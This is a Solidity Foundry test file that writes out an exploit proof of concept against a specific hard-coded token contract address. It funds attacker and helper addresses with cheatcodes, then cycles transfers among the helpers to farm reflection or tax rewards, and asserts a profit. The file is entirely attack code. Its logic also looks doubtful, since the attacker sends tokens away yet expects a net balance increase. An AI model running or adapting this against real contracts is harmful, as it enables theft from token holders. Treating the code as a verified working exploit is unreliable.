pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x16bE19fB70F902EcF39b54aD988eE427cB1b6848;
    address attacker = address(this);

    // Helper addresses
    address helper1 = address(0x100);
    address helper2 = address(0x200);
    address helper3 = address(0x300);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for debugging
        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");
        vm.label(helper3, "Helper3");

        // Get initial tokens for attacker
        uint256 initialAmount = 1000 * 10**18;
        deal(TARGET, attacker, initialAmount);

        // Get tokens for helpers
        deal(TARGET, helper1, initialAmount);
        deal(TARGET, helper2, initialAmount);
        deal(TARGET, helper3, initialAmount);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = IBEP20(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Transfer tokens to helpers to ensure they're in _accounts array
        IBEP20(TARGET).transfer(helper1, 100 * 10**18);
        IBEP20(TARGET).transfer(helper2, 100 * 10**18);
        IBEP20(TARGET).transfer(helper3, 100 * 10**18);

        // Make transfers between helpers to trigger tax distribution
        // Helper1 -> Helper2
        vm.prank(helper1);
        IBEP20(TARGET).transfer(helper2, 50 * 10**18);

        // Helper2 -> Helper3
        vm.prank(helper2);
        IBEP20(TARGET).transfer(helper3, 50 * 10**18);

        // Helper3 -> Helper1
        vm.prank(helper3);
        IBEP20(TARGET).transfer(helper1, 50 * 10**18);

        // Repeat to accumulate more tax rewards
        for (uint i = 0; i < 5; i++) {
            vm.prank(helper1);
            IBEP20(TARGET).transfer(helper2, 10 * 10**18);

            vm.prank(helper2);
            IBEP20(TARGET).transfer(helper3, 10 * 10**18);

            vm.prank(helper3);
            IBEP20(TARGET).transfer(helper1, 10 * 10**18);
        }

        // Check final balance
        uint256 finalBalance = IBEP20(TARGET).balanceOf(attacker);
        console.log("Final balance:", finalBalance);
        console.log("Balance increase:", finalBalance - initialBalance);

        // Verify the exploit worked - attacker's balance should have increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");

        // Additional check with IERC20 interface
        uint256 erc20FinalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(erc20FinalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

